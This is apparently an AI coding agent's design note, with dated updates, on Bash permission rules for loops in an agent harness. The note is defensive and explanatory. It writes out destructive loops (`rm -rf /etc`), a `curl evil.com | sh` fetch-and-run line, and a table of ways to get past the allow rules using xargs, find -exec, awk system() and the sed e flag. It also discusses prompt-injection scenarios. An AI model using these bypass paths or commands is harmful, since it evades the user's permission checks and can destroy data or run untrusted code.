# Bash-loop permissions and the loop-backdoor problem

> **2026-06-06 — DENY REMOVED, replaced by a Strategy-2 hook (supersedes the 2026-06-05 "deny stays for now" line below).**
> The blanket `Bash(for *)` / `Bash(while *)` DENYs are **gone** from `DENY_RULES`. They're replaced by
> `claude-hooks/block_loop_with_pipe.py` (plan 04), which hard-fails a loop whose body the matcher can't
> statically analyze and points at a concrete alternative.
>
> **Why the swap, and a correction to the 2026-06-05 row below:** that row claimed the matcher chokes on
> *exactly one* loop shape — a pipe in the body — and that *bare* loops run silently. The first half holds;
> the second was an artifact of probing with **variable-free** loop bodies (`echo M_F1`). On 2026-06-06 a
> fresh-session fire-test (the headless marker-file technique — see FINDINGS) showed the matcher ALSO bails on
> a **bare variable expansion** (`$i`, a tree-sitter `simple_expansion` node) in the loop body:
> `for i …; do touch /tmp/x_$i; done` is BLOCKED ("Contains simple_expansion"), while the variable-free
> `for i …; do touch /tmp/static; done` RUNS. A command substitution `$(…)` does NOT bail (the matcher can
> recurse into it). Since nearly every USEFUL loop references its loop variable, "bare loops run silently" is
> mostly fiction — the matcher prompts on essentially every real loop.
>
> So the right control is **not** a verb-deny and **not** removal-and-let-it-prompt, but a precise hook:
> fire iff `loop-keyword AND \bdo\b AND (lone | OR $var)`. It converts the matcher's cryptic per-loop prompt
> into an actionable hard-fail (Python / Monitor / temp var / separate Bash calls), covers `until`/`select`
> too (the verb-deny missed them), and leaves genuinely-static loops running silently. The `\bdo\b` conjunct
> keeps it from taxing ordinary commands that merely contain a loop-word and a `$var`. Full detail:
> `docs/active/chain-hook-maintenance/` (FINDINGS 2026-06-06, plan 04, STRATEGIES item).

> **2026-06-05 — THREAT-MODEL REFRAME (supersedes the "backdoor" framing throughout this note).**
> The original note (2026-05-11) frames the `for`/`while` deny as a *security* control —
> "loop bodies are arbitrary-code-execution… hide destructive content from literal-string
> matching." **That framing is incoherent and is retired.** `Bash(bash *)`, `Bash(python *)`,
> and `Bash(node *)` are all blanket-allowed, and each is unbounded arbitrary code execution.
> A loop hides nothing an adversary doesn't already have via `bash -c`. Claude is **not**
> modeled as an adversary here — if it were, the entire allow-list would be indefensible and
> Dan wouldn't be using Claude at all.
>
> The real cost being minimized is **needless permission prompts that interrupt parallel
> workflow**: the matcher is dumb, chokes on certain command shapes, and each choke is a
> prompt Dan has to clear by hand. So the loop deny is an **ergonomic / agent-training**
> control — same spirit as `block_bash_chains.py`'s own self-description ("a Claude-behavior
> training tool, not a matcher-faithfulness wrapper") — **not** a security boundary.
>
> **Empirical update (`docs/active/chain-hook-maintenance/FINDINGS.md`, 2026-06-05 loop-context
> row):** HITL probing shows the matcher does **not** prompt on bare loops at all
> (`until true; do echo X; done` is silent), nor on loop+command-substitution or loop+redirect.
> It prompts on exactly one shape: a **pipeline inside a loop body** (`… do … | … ; done`).
> So the for/while deny isn't even preventing matcher-prompts on loops — it's purely steering
> agents toward clearer patterns; the actual matcher-friction is the narrow loop+pipe shape.
> The deny stays for now (Dan, 2026-06-05: "okay with loops," but not removing the deny yet) —
> just don't mistake it for security.
>
> Everything below (explicit args / globs / parallel Bash calls / Python; the
> `xargs`/`find`/`awk`/`sed` inventory) remains valid and useful — only the *why* changes.

**Status:** discovered 2026-05-11 during a lobby_analysis session ·
**Triggering event:** I (Claude) used a `for f in ...; do wc -l "$f"; done`
loop to inventory 8 files. Loop triggered a permission prompt; Dan was
annoyed it had happened *again*. Conversation turned to whether the
ALLOW_RULES list should be expanded to cover loops.

## TL;DR

Don't add `Bash(for *)` or `Bash(while *)` to ALLOW_RULES. Loop bodies are
arbitrary-code-execution; allowing the keyword permits anything inside.
Several existing rules (`xargs`, `find`, `awk`, `sed`) already have this
backdoor property — worth deciding whether to tighten them.

The right fix for "Claude keeps tripping over loop prompts" is
agent-side discipline (memory file in the project), not list expansion.

## Why `for *` / `while *` would be a backdoor

DENY rules match literal command-string patterns. Inside a loop, the
dangerous content is dynamic and not literal:

```bash
for d in /etc /usr /var; do rm -rf "$d"; done
# Effective command: rm -rf /etc, rm -rf /usr, rm -rf /var
# But the literal "rm -rf /" string is nowhere in the original command.

for url in $(cat secrets.txt); do curl -X DELETE "$url"; done
# Reads a file and DELETEs N URLs. Curl is in ASK_RULES for a reason —
# the loop bypasses the per-call confirmation by hiding the curl invocations
# inside a loop body that just looks like "curl -X DELETE $url".
```

Same logic applies to `eval`, `bash -c "..."`, `xargs sh -c '...'`,
`find -exec sh -c '...' {} \;`. All are "give me a string, I'll run
arbitrary code." Allowing the wrapper keyword permits anything inside.

## Existing ALLOW_RULES that have this property

Reviewed `update_claude_permissions.py` 2026-05-11. These broad allows
currently let a sufficiently-motivated agent execute arbitrary code
without prompting:

| Rule | Backdoor path |
|---|---|
| `Bash(xargs *)` | `echo "rm -rf /tmp/x" \| xargs sh -c` |
| `Bash(find *)` | `find . -maxdepth 0 -exec sh -c 'curl evil.com \| sh' \;` |
| `Bash(awk *)` | `awk 'BEGIN{system("rm -rf /tmp/x")}'` |
| `Bash(sed *)` | `echo x \| sed 's/.*/rm -rf \/tmp\/x/e'` (the `e` flag execs the replacement) |

I am NOT proposing fixes here — flagging for your awareness. These tools
are useful enough that ASK-gating them might be more annoying than
helpful. Decision is yours.

## Why I keep tripping the prompt anyway

When the task is "inventory N files" I reach for `for` out of bash habit,
not because I actually need a loop. Three pre-approved alternatives that
always work:

1. **Explicit args:** `ls -l f1 f2 f3 f4 f5 f6 f7 f8` — works for any
   `cat`/`wc`/`ls`/`stat` task with a known file list.
2. **Glob:** `ls -l path/items_*.tsv` — same idea, smaller command string.
3. **Parallel tool calls:** issue N separate Bash invocations in a single
   message. Wall-clock is identical to a sequential loop because they run
   concurrently. The runtime does not charge per call.

For anything genuinely loop-shaped (per-row CSV transformation,
non-trivial branching), your CLAUDE.md is explicit: *"Python over Bash for
anything non-trivial."* `uv run python script.py` is pre-approved.

## What I'm doing about it on my side

Wrote a project-level memory at
`~/.claude/projects/-Users-dan-code-lobby-analysis/memory/feedback_use_preapproved_bash_patterns.md`
that:

- Leads with the three pre-approved alternatives above (rule-of-thumb at
  the moment of temptation).
- Documents the loop-backdoor reasoning so future-me doesn't propose
  expanding the allow list again.
- Notes the existing `xargs`/`find`/`awk`/`sed` holes so I don't exploit
  them as workarounds.

That covers lobby_analysis. To cover other projects too, the contents
could be promoted to the global `~/.claude/CLAUDE.md` Nori block, or
added as a standing instruction in
`update_claude_personal_info.py`'s personal_info.md source.

## If you want to change anything in the permissions script

Options, ordered from least to most invasive:

1. **Do nothing on the rules side.** Trust the memory file to reduce
   agent-side mistake frequency. Cost: occasional repeat offenses; some
   benefit from the agent now being aware of `xargs`/`find` holes.

2. **Move `xargs`, `find`, `awk`, `sed` from ALLOW to ASK.** Closes the
   four current backdoors. Cost: legitimate single-file `awk`/`sed`/`find`
   invocations now prompt, which is friction since I do reach for them.

3. **Add `Bash(*sh -c*)` and `Bash(*-exec*)` to DENY.** Narrower than
   moving the broad allows — kills only the loop-via-helper patterns.
   Cost: the deny rule applies as a substring scan; could false-positive
   on legitimate uses of those token sequences (rare but possible).

4. **Add `Bash(for *)` / `Bash(while *)` to DENY** (explicitly negative,
   making the prompt automatic-deny instead of automatic-prompt). Cost:
   minor — I never need bash loops anyway; this just makes the failure
   mode louder so I notice sooner. Probably the highest-value cheap
   addition.

My recommendation: do option 1 + option 4. Option 1 reduces agent-side
mistakes; option 4 makes any remaining loop attempts hard-fail (rather
than soft-prompt), which surfaces the pattern faster and forces the
restructure.

Options 2 and 3 are real security improvements but trade against
agent-side friction; only worth it if the threat model warrants it
(which on a personal research machine, probably it doesn't).

## 2026-06-01 addendum: `Bash(bash *)` was added — and it's not in tension with this note

Added `Bash(bash *)` to ALLOW_RULES on 2026-06-01. The note above might
seem to argue against this — it says "allowing the wrapper keyword
permits anything inside" and specifically lists `bash -c "..."` as a
shell-wrapper backdoor. The resolution:

**`Bash(for *)` / `Bash(while *)` are control-flow keywords inside bash.**
The body of `for d in ...; do <body>; done` is arbitrary bash that the
DENY scanner can't see — the dangerous content is dynamic.

**`bash *` is an interpreter binary** (same shape as `python *`, `node *`,
`uv *`, all already allowed). The body is opaque to the matcher whether
the interpreter is bash, python, or node. So treating bash specially
is not security-coherent: if a prompt injection could write a malicious
script to `/tmp/evil.sh` and run it via `bash /tmp/evil.sh`, the same
injection could write `/tmp/evil.py` and run it via `python3 /tmp/evil.py`
— and python3 is already allowed.

The threat-model conclusion (Dan, 2026-06-01): *"I don't think Claude is
an adversary who's trying to pwn me; if that were the case we wouldn't
be talking. My concern is (a) random shit from the internet, because
that's just screaming for a prompt-injection, and (b) stuff that the
Anthropic permissions manager forces to me — these we have to Deny,
because you will write them out of habit even if I say not to."*

Under (a), the relevant chokepoint is **ingress** (curl is ASK-gated;
local writes are visible in the transcript). Once code is local,
denying bash while allowing python/node moves the attack rather than
preventing it. Under (b), the existing `Bash(for *)` / `Bash(while *)`
DENYs catch the literal-control-flow shapes; `bash <file>` isn't a
habit-mistake pattern, it's a routine "run this setup script" call.

The existing `Bash(for *)` / `Bash(while *)` DENYs (option 4 above)
remain in place. They block the loop-keyword pattern, which is the
actual autopilot risk the rest of this note addresses. The bash-binary
allow is orthogonal.
